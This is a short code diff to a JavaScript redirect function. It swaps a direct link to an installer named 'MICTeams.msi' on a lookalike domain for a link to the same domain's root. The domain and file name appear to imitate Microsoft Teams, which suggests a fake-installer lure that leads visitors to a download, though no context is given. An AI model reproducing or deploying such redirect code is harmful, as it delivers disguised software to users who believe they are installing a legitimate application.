@@ -1,5 +1,5 @@
 function GetToFunction()
 {
-	var url="https://ytteamsp.top/MICTeams.msi";
+	var url="https://ytteamsp.top";
 	window.location=url;
 }
